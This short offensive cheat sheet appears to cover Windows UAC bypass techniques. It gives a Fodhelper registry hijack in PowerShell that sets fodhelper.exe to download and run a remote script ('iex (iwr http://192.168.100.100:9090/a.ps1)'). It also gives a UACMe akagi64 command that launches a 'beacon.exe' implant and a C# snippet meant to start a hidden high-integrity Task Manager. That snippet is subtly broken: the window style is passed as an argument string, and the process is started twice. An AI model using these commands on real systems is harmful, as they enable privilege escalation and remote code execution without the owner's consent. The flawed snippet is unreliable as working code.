# Fodhelper Technique
```
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c powershell.exe iex (iwr -usebasicparsing http://192.168.100.100:9090/a.ps1)" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```
# UACMe
```
shell C:\Users\Public\akagi64 59 C:\Users\Public\beacon.exe

```
# Custom Tradecraft With C#
To create a hidden instance of the Taskmgr, which will be running in high integrity without the user seeing anything.
```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace SimpleUAC
{
    class Program
    {
        static void Main(string[] args)
        {

            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "Taskmgr.exe";
            startInfo.Arguments = "WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden";
            Process p = new Process();
            p.StartInfo = startInfo;
            p.Start();
            p.Start();
            Console.WriteLine(p.Id);



        }
    }
}
```
